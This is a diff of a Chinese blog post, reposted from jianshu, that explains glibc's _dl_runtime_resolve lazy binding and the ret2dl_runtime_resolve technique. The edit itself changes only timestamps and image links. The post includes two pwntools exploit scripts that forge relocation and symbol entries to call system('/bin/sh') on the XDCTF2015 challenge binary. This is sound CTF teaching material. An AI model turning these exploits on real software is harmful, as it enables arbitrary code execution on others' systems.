@@ -7,7 +7,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
 <meta property="article:published_time" content="2021-08-15T11:51:01.991Z">
-<meta property="article:modified_time" content="2021-08-15T12:12:14.258Z">
+<meta property="article:modified_time" content="2021-08-15T12:49:30.962Z">
 <meta property="article:author" content="tianmai">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/08/15/dl_runtime_resolve/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
@@ -56,7 +56,7 @@
   isHome: false,
   isHighlightShrink: false,
   isToc: true,
-  postUpdate: '2021-08-15 20:12:14'
+  postUpdate: '2021-08-15 20:49:30'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -138,7 +138,7 @@
           document.documentElement.classList.remove('hide-aside')
         }
       }
-    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">pwnpwn小菜鸡</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">_dl_runtime_resolve</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-15T11:51:01.991Z" title="发表于 2021-08-15 19:51:01">2021-08-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-15T12:12:14.258Z" title="更新于 2021-08-15 20:12:14">2021-08-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="_dl_runtime_resolve"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="dl-runtime-resolve函数具体运行模式"><a href="#dl-runtime-resolve函数具体运行模式" class="headerlink" title="_dl_runtime_resolve函数具体运行模式"></a>_dl_runtime_resolve函数具体运行模式</h3><ol>
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">pwnpwn小菜鸡</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">_dl_runtime_resolve</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-15T11:51:01.991Z" title="发表于 2021-08-15 19:51:01">2021-08-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-15T12:49:30.962Z" title="更新于 2021-08-15 20:49:30">2021-08-15</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="_dl_runtime_resolve"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="dl-runtime-resolve函数具体运行模式"><a href="#dl-runtime-resolve函数具体运行模式" class="headerlink" title="_dl_runtime_resolve函数具体运行模式"></a>_dl_runtime_resolve函数具体运行模式</h3><ol>
 <li>首先用<code>link_map</code>访问<code>.dynamic</code>，分别取出<code>.dynstr</code>、<code>.dynsym</code>、<code>.rel.plt</code>的地址</li>
 <li><code>.rel.plt</code>+参数<code>relic_index</code>，求出当前函数的重定位表项<code>Elf32_Rel</code>的指针，记作<code>rel</code></li>
 <li><code>rel-&gt;r_info</code> &gt;&gt; <code>8</code> 作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf32_Sym</code>的指针，记作<code>sym</code></li>
@@ -147,33 +147,33 @@
 <li>最后调用这个函数</li>
 </ol>
 <p>以<code>puts</code>为例追踪一下<code>ELF</code>文件<code>libc</code>函数解析过程</p>
-<h3 id="0x00-call-puts-plt"><a href="#0x00-call-puts-plt" class="headerlink" title="0x00 call puts@plt"></a>0x00 call puts@plt</h3><p><img src="https://upload-images.jianshu.io/upload_images/14920242-8b63bcb21448c4c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt="img"></p>
-<h3 id="0x01-si进入call-puts-plt"><a href="#0x01-si进入call-puts-plt" class="headerlink" title="0x01 si进入call puts@plt"></a>0x01 <code>si</code>进入<code>call puts@plt</code></h3><p><img src="https://upload-images.jianshu.io/upload_images/14920242-9f24c136f9f63af2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
-<h3 id="0x02-因为会jmp-dword-ptr-0x804a00c-，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts-plt第二条指令的地址，即read-got中初始存放read-plt的第二条指令地址"><a href="#0x02-因为会jmp-dword-ptr-0x804a00c-，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts-plt第二条指令的地址，即read-got中初始存放read-plt的第二条指令地址" class="headerlink" title="0x02 因为会jmp dword ptr [0x804a00c]，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts@plt第二条指令的地址，即read@got中初始存放read@plt的第二条指令地址"></a>0x02 因为会<code>jmp dword ptr [0x804a00c]</code>，所以查看一下<code>0x804a00c</code>的内容，存放的是<code>0x080482e6</code>地址，其中<code>0x080482e6</code>是<code>puts@plt</code>第二条指令的地址，即<strong>read@got</strong>中初始存放<code>read@plt</code>的<strong>第二条指令地址</strong></h3><p><img src="https://upload-images.jianshu.io/upload_images/14920242-af2b8eeb83c85e37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/602/format/webp" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-16ce0f83644c4046.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-fb03d098486f418c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
-<h3 id="0x03-jmp-0x80482d0"><a href="#0x03-jmp-0x80482d0" class="headerlink" title="0x03 jmp 0x80482d0"></a>0x03 jmp 0x80482d0</h3><p><img src="https://upload-images.jianshu.io/upload_images/14920242-20c06e219d6c4542.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1012/format/webp" alt="img"></p>
+<h3 id="0x00-call-puts-plt"><a href="#0x00-call-puts-plt" class="headerlink" title="0x00 call puts@plt"></a>0x00 call puts@plt</h3><p><img src="/images/31.png" alt="avatar"></p>
+<h3 id="0x01-si进入call-puts-plt"><a href="#0x01-si进入call-puts-plt" class="headerlink" title="0x01 si进入call puts@plt"></a>0x01 <code>si</code>进入<code>call puts@plt</code></h3><p><img src="/images/32.png" alt="avatar"></p>
+<h3 id="0x02-因为会jmp-dword-ptr-0x804a00c-，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts-plt第二条指令的地址，即read-got中初始存放read-plt的第二条指令地址"><a href="#0x02-因为会jmp-dword-ptr-0x804a00c-，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts-plt第二条指令的地址，即read-got中初始存放read-plt的第二条指令地址" class="headerlink" title="0x02 因为会jmp dword ptr [0x804a00c]，所以查看一下0x804a00c的内容，存放的是0x080482e6地址，其中0x080482e6是puts@plt第二条指令的地址，即read@got中初始存放read@plt的第二条指令地址"></a>0x02 因为会<code>jmp dword ptr [0x804a00c]</code>，所以查看一下<code>0x804a00c</code>的内容，存放的是<code>0x080482e6</code>地址，其中<code>0x080482e6</code>是<code>puts@plt</code>第二条指令的地址，即<strong>read@got</strong>中初始存放<code>read@plt</code>的<strong>第二条指令地址</strong></h3><p><img src="/images/33.png" alt="avatar"></p>
+<p><img src="/images/34.png" alt="avatar"></p>
+<p><img src="/images/35.png" alt="avatar"></p>
+<h3 id="0x03-jmp-0x80482d0"><a href="#0x03-jmp-0x80482d0" class="headerlink" title="0x03 jmp 0x80482d0"></a>0x03 jmp 0x80482d0</h3><p><img src="/images/36.png" alt="avatar"></p>
 <p>其中<code>ds:0x804a008</code>存放的是<code>_dl_runtime_resolve</code>的地址</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-204e29de1f9d020c.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt="img"></p>
+<p><img src="/images/37.png" alt="avatar"></p>
 <p>这样的话，加上之前的<code>push 0</code>，就<code>push</code>了两个参数，这两个参数刚好是<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>需要的参数，其中<code>0x804a004</code>就是<code>link_map</code>指针，<code>0</code>就是<code>reloc_index</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push   0</span><br><span class="line">push   dword ptr [0x804a004]</span><br></pre></td></tr></table></figure>
 
 <h3 id="0x04-那么我们看看通过这两个参数是如何找到puts函数的呢"><a href="#0x04-那么我们看看通过这两个参数是如何找到puts函数的呢" class="headerlink" title="0x04 那么我们看看通过这两个参数是如何找到puts函数的呢"></a>0x04 那么我们看看通过这两个参数是如何找到puts函数的呢</h3><ul>
 <li><p>首先找到 link_map 的地址</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-a80b224c7393e7e5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/602/format/webp" alt="img"></p>
+<p><img src="/images/38.png" alt="avatar"></p>
 <ul>
 <li><p>然后通过 link_map 找到 .dynamic 的地址，其中第三个地址就是 .dynamic 的地址，即 0x8049f14</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-56d9652c43ce3b0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<p><img src="/images/39.png" alt="avatar"></p>
 </li>
 <li><p>然后通过 .dynamic 来找到 .dynstr 、.dynsym 、.rel.plt 的地址</p>
 <p>.dynamic 的地址加 0x44 的位置是 .dynstr   :[0x08049f14+0x44]=[0x08049f58]，即 0x0804821c</p>
 <p>.dynamic 的地址加 0x4c 的位置是 .dynsym   :[0x08049f14+0x4c]=[0x08049f60]，即 0x080481cc</p>
 <p>.dynamic 的地址加 0x84 的位置是 .rel.plt:   [0x08049f14+0x84]=[0x08049f98]，即 0x08048298</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-529e31bd92dbaa57.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<p><img src="/images/40.png" alt="avatar"></p>
 </li>
 <li><p>然后用 .rel.plt 的地址加上参数 reloc_index ，即 0x8048298+0=0x8048298 找到函数的重定位表项 Elf32_Rel 的指针，记作rel</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-f17c9d898a9191ca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/879/format/webp" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-d248462ae29ba470.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<p><img src="/images/41.png" alt="avatar"></p>
+<p><img src="/images/42.png" alt="avatar"></p>
 </li>
 <li><p>这里<code>rel</code>为<code>0x8048298</code>，所以</p>
 </li>
@@ -182,17 +182,17 @@
 
 <ul>
 <li><p>通过 Elf32_rel 结构的 r_info &gt;&gt; 8 = 107h &gt;&gt; 8 = 1 作为 .dynsym 中的下标</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-ba9aa4167e3c5a1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-a554d459a1c126e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<p><img src="/images/43.png" alt="avatar"></p>
+<p><img src="/images/44.png" alt="avatar"></p>
 </li>
 <li><p>查看 0x80481dc 内存，找到 puts 在 .dynstr 表项索引为 0x1a，所以 st_name 的地址为 0x804821c+0x1a=0x8048236</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-0a8e9c9c462f1a73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-37028b08f2d23b0b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/841/format/webp" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-c86794f7f5ee8bbf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/608/format/webp" alt="img"></p>
+<p><img src="/images/45.png" alt="avatar"></p>
+<p><img src="/images/46.png" alt="avatar"></p>
+<p><img src="/images/47.png" alt="avatar"></p>
 </li>
 <li><p>最后在动态链接库查找这个函数的地址，并且把地址赋值给 *rel-&gt;r_offset ，即 GOT 表就可以了</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-79b865b7e639dada.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-84a0aef0de6ccee2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<p><img src="/images/48.png" alt="avatar"></p>
+<p><img src="/images/49.png" alt="avatar"></p>
 </li>
 </ul>
 <h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
@@ -200,11 +200,11 @@
 <li><code>reloc_index</code>即参数<code>n</code>是我们可以控制的，我们需要做的事通过一系列操作，把<code>reloc_index</code>可控转化为<code>st_name</code>可控；我们需要在一个可写地址上构造一系列伪结构就可以完成利用或在条件允许的情况下直接修改<code>.dynstr</code></li>
 <li>所以我们需要在程序中找一段空间<code>start</code>出来，放我们直接构造的<code>fake_dynsym</code>，<code>fake_dynstr</code>和<code>fake_rel_plt</code>等，然后利用栈迁移到手法将栈转移到<code>start</code></li>
 </ul>
-<h4 id="0x00-计算reloc-index"><a href="#0x00-计算reloc-index" class="headerlink" title="0x00 计算reloc_index"></a>0x00 计算reloc_index</h4><p><img src="https://upload-images.jianshu.io/upload_images/14920242-5b71208e34dbb4a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<h4 id="0x00-计算reloc-index"><a href="#0x00-计算reloc-index" class="headerlink" title="0x00 计算reloc_index"></a>0x00 计算reloc_index</h4><p><img src="/images/50.png" alt="avatar"></p>
 <ul>
 <li><code>relic_index = fake_rel_plt_addr - 0x804833c</code></li>
 </ul>
-<h4 id="0x01-计算r-info"><a href="#0x01-计算r-info" class="headerlink" title="0x01 计算r_info"></a>0x01 计算r_info</h4><p><img src="https://upload-images.jianshu.io/upload_images/14920242-dd8459431e2a5f84.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<h4 id="0x01-计算r-info"><a href="#0x01-计算r-info" class="headerlink" title="0x01 计算r_info"></a>0x01 计算r_info</h4><p><img src="/images/51.png" alt="avatar"></p>
 <p>r_info的计算方法有两个步骤</p>
 <ul>
 <li><p><code>x = （欲伪造的地址 - .dynsym基地址）/ 0x10</code></p>
@@ -212,7 +212,7 @@
 <li><p><code>r_info = x &lt;&lt; 8 | 0x7</code></p>
 </li>
 </ul>
-<h4 id="0x02-计算st-name"><a href="#0x02-计算st-name" class="headerlink" title="0x02 计算st_name"></a>0x02 计算st_name</h4><p><img src="https://upload-images.jianshu.io/upload_images/14920242-01ebcd638551674b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<h4 id="0x02-计算st-name"><a href="#0x02-计算st-name" class="headerlink" title="0x02 计算st_name"></a>0x02 计算st_name</h4><p><img src="/images/52.png" alt="avatar"></p>
 <ul>
 <li><code>st_name = fake_dynstr_addr - 0x804827c</code></li>
 </ul>
@@ -221,11 +221,11 @@
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> process</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">&#x27;main&#x27;</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line"></span><br><span class="line">buf += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-bb30565b1f470f3a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<p><img src="/images/53.png" alt="avatar"></p>
 <ul>
 <li>方法二：其实一步一步伪构造能更容易理解过程，可以参考<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://xz.aliyun.com/t/5122">高级ROP ret2dl_runtime 之通杀详解</a>和<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://bbs.pediy.com/thread-250703.htm">ROP高级用法之ret2_dl_runtime_resolve</a></li>
 </ul>
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-e585868e4d54e032.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<p><img src="/images/54.png" alt="avatar"></p>
 <p>构造的ROP</p>
 <ul>
 <li>上面构造的<code>ROP</code>左边是做一个栈的迁移</li>
@@ -233,7 +233,7 @@
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;deepin-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span> ,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">name = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line">p = process(name)</span><br><span class="line">elf= ELF(name)</span><br><span class="line">rel_plt_addr = elf.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr   <span class="comment">#0x8048330</span></span><br><span class="line">dynsym_addr =  elf.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr    <span class="comment">#0x80481d8</span></span><br><span class="line">dynstr_addr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr     <span class="comment">#0x8048278</span></span><br><span class="line">resolve_plt = <span class="number">0x08048380</span></span><br><span class="line">leave_ret_addr = <span class="number">0x0804851D</span></span><br><span class="line">start = <span class="number">0x804aa00</span></span><br><span class="line">fake_rel_plt_addr = start</span><br><span class="line">fake_dynsym_addr = fake_rel_plt_addr + <span class="number">0x8</span></span><br><span class="line">fake_dynstr_addr = fake_dynsym_addr + <span class="number">0x10</span></span><br><span class="line">bin_sh_addr = fake_dynstr_addr + <span class="number">0x8</span></span><br><span class="line"><span class="comment">#n index_arg</span></span><br><span class="line">n = fake_rel_plt_addr - rel_plt_addr</span><br><span class="line">r_info = (((fake_dynsym_addr - dynsym_addr)/<span class="number">0x10</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span></span><br><span class="line">str_offset = fake_dynstr_addr - dynstr_addr</span><br><span class="line">fake_rel_plt = p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + p32(r_info)</span><br><span class="line">fake_dynsym = p32(str_offset) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12000000</span>)</span><br><span class="line">fake_dynstr = <span class="string">&quot;system&quot;</span>+<span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">fake_dynstr += <span class="string">&quot;/bin/sh&quot;</span>+<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">pay1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">108</span> + p32(start - <span class="number">20</span>) + p32(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p32(leave_ret_addr) + p32(<span class="number">0</span>) + p32(start - <span class="number">20</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">p.sendline(pay1)</span><br><span class="line">pay2 = p32(<span class="number">0x0</span>) + p32(resolve_plt) + p32(n) + <span class="string">&#x27;aaaa&#x27;</span> + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstr</span><br><span class="line">p.sendline(pay2)</span><br><span class="line">success(<span class="string">&quot;.rel_plt: &quot;</span> + <span class="built_in">hex</span>(rel_plt_addr))</span><br><span class="line">success(<span class="string">&quot;.dynsym: &quot;</span> + <span class="built_in">hex</span>(dynsym_addr))</span><br><span class="line">success(<span class="string">&quot;.dynstr: &quot;</span> + <span class="built_in">hex</span>(dynstr_addr))</span><br><span class="line">success(<span class="string">&quot;fake_rel_plt_addr: &quot;</span> + <span class="built_in">hex</span>(fake_rel_plt_addr))</span><br><span class="line">success(<span class="string">&quot;fake_dynsym_addr: &quot;</span> + <span class="built_in">hex</span>(fake_dynsym_addr))</span><br><span class="line">success(<span class="string">&quot;fake_dynstr_addr: &quot;</span> + <span class="built_in">hex</span>(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">&quot;n: &quot;</span> + <span class="built_in">hex</span>(n))</span><br><span class="line">success(<span class="string">&quot;r_info: &quot;</span> + <span class="built_in">hex</span>(r_info))</span><br><span class="line">success(<span class="string">&quot;offset: &quot;</span> + <span class="built_in">hex</span>(str_offset))</span><br><span class="line">success(<span class="string">&quot;system_addr: &quot;</span> + <span class="built_in">hex</span>(fake_dynstr_addr))</span><br><span class="line">success(<span class="string">&quot;bss_addr: &quot;</span> + <span class="built_in">hex</span>(elf.bss()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://upload-images.jianshu.io/upload_images/14920242-127c99183f7db6d0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200/format/webp" alt="img"></p>
+<p><img src="/images/55.png" alt="avatar"></p>
 <p>本作品转自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/57f6474fe4c6">常向阳_的博客</a><br>原文链接：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/57f6474fe4c6">https://www.jianshu.com/p/57f6474fe4c6</a></p>
 </li>
 </ul>
